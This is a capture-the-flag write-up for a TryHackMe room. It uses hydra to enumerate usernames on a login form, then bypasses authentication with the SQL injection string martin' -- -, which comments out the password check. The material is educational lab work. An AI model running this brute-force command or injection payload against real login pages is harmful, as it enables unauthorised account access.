# Lesson Learned?

[TryHackMe Room](https://tryhackme.com/room/lessonlearned)

## Solution

- from the ctf description this looks like just a simple website

- nmap scan: 22, 80

- website is a very simple login page which makes a post request with username and password fields

- can try to use hydra to enumerate the usernames, maybe the error message will be different

```console
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -p password $IP http-post-form "/:username=^USER^&password=^PASS^:Invalid username and password."
```

- found one username `martin`

- we can try to think of the SQL query as

```SQL
SELECT * FROM users WHERE username = 'username' AND password = 'password'
```

- since we know the username we can try to inject into the query a string that
  will work regardless of the password (this works if the password is checked
  after the username only)

- if we use the following text as the username we will remove the password check

```text
martin' -- -
```

```SQL
SELECT * FROM users WHERE username = 'martin' -- -' AND password = ''
```

- with this new prompt we bypass the login and find the flag
